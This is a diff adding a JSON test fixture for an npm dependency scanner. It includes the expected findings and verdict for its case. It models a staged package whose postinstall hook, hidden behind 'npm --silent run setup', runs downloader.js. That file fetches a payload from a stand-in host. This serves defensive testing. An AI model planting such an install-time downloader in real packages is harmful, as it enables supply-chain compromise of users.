@@ -1,0 +1,62 @@
+{
+  "id": "added-dependency-flagged-delegated-install-downloader",
+  "title": "A dependency places an npm config flag before its delegated install script",
+  "category": "dependency-introduction",
+  "intent": "npm accepts config flags around the run subcommand. Flag placement must not hide the delegated downloader or demote a blocking install-time request to an unproven medium signal.",
+  "previousPackageJson": { "name": "consumer", "version": "1.0.0" },
+  "stagedPackageJson": {
+    "name": "consumer",
+    "version": "1.1.0",
+    "dependencies": { "flagged-downloader": "1.0.0" }
+  },
+  "dependencyArtifacts": {
+    "flagged-downloader": {
+      "version": "1.0.0",
+      "packageJson": {
+        "name": "flagged-downloader",
+        "version": "1.0.0",
+        "scripts": {
+          "postinstall": "npm --silent run setup",
+          "setup": "node downloader.js"
+        }
+      },
+      "files": [
+        {
+          "path": "package.json",
+          "size": 159,
+          "sha256": "flagged-delegated-package-json",
+          "flags": [],
+          "textSample": "{\"name\":\"flagged-downloader\",\"version\":\"1.0.0\",\"scripts\":{\"postinstall\":\"npm --silent run setup\",\"setup\":\"node downloader.js\"}}"
+        },
+        {
+          "path": "downloader.js",
+          "size": 55,
+          "sha256": "flagged-delegated-downloader",
+          "flags": [],
+          "textSample": "fetch('https://cdn.example.invalid/flagged-payload');\n"
+        }
+      ]
+    }
+  },
+  "expectedDependencies": [
+    {
+      "name": "flagged-downloader",
+      "section": "dependencies",
+      "declaredSpec": "1.0.0",
+      "declarationKind": "exact",
+      "status": "inspected",
+      "resolvedVersion": "1.0.0",
+      "verdict": "install-risk",
+      "automaticExecution": [{ "kind": "script", "name": "postinstall" }]
+    }
+  ],
+  "expectedFindings": [
+    {
+      "ruleId": "dependency-artifact.install-risk",
+      "severity": "high",
+      "file": "<dependency>flagged-downloader@1.0.0:package.json"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedRecommendation": "block manual approval"
+}
